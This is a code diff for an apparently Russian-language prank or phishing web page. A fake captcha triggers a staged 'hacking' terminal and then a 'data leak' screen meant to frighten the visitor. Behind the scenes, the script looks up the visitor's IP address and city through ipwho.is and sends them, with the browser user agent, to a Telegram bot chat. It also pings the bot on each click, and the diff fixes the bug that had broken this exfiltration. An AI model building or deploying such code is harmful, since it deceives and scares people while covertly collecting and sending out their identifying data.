@@ -28,9 +28,9 @@
             <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
             <hr>
             <p>> Статус: <span style="color:red; font-weight:bold;">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
-            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">...</span></p>
-            <p>> Город: <span id="user-geo" style="color:#fff;">...</span></p>
-            <p>> Устройство: <span id="user-os" style="color:#fff;">...</span></p>
+            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">Определение...</span></p>
+            <p>> Город: <span id="user-geo" style="color:#fff;">Поиск...</span></p>
+            <p>> Устройство: <span id="user-os" style="color:#fff;">Загрузка...</span></p>
             <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ:</p>
             <ul style="color: #ff4d4d;">
                 <li>История браузера: извлечена (2,431 запись)</li>
@@ -45,10 +45,12 @@
         const chat_id = "-1003861311533";
 
         async function startHack() {
-     
+         
             document.getElementById('captcha-box').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
+ 
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚀 Клик зафиксирован! Начинаю взлом...")}`);
 
             const lines = [
                 "> [INIT] Инициализация взлома...",
@@ -57,47 +59,52 @@
                 "> [CRITICAL] Доступ к ядру получен",
                 "> [INFO] Извлечение базы паролей...",
                 "> [INFO] Копирование медиафайлов...",
-                "> [ALERT] Сжатие данных. Отправка..."
+                "> [ALERT] Отправка данных на сервер..."
             ];
 
-        
+ 
             for (let line of lines) {
                 let p = document.createElement('p');
                 p.innerText = line;
                 term.appendChild(p);
                 window.scrollTo(0, document.body.scrollHeight);
-                await new Promise(r => setTimeout(r, 200)); 
+                await new Promise(r => setTimeout(r, 250)); 
             }
 
-        
-            await sendFullLogs();
+   
+            await sendFullData();
 
-     
+   
             term.style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
         }
 
-        async function sendFullLogs() {
+        async function sendFullData() {
+            let ip = "Не определен";
+            let city = "Не определен";
+            let device = navigator.userAgent;
+
             try {
+               
                 const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
                 
-   
-                const ip = d.ip || "Не определен";
-                const city = d.city || "Не определен";
-                const org = (d.connection && d.connection.org) ? d.connection.org : "Не определен";
+                if (d.success) {
+                    ip = d.ip;
+                    city = d.city;
+                }
 
                 document.getElementById('user-ip').innerText = ip;
                 document.getElementById('user-geo').innerText = city;
                 document.getElementById('user-os').innerText = navigator.platform;
 
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n🏢 Провайдер: ${org}\n📱 Устройство: ${navigator.userAgent}`;
-                
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${device}`;
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-                const backup = `⚠️ Переход (Ошибка IP)!\n📱 ${navigator.userAgent}\n❌ Ошибка: ${e.message}`;
-                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
+                
+                const errLog = `⚠️ Переход (Ошибка IP)!\n📱 ${device}\n❌ Ошибка кода: ${e.message}`;
+                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(errLog)}`);
             }
         }
     </script>
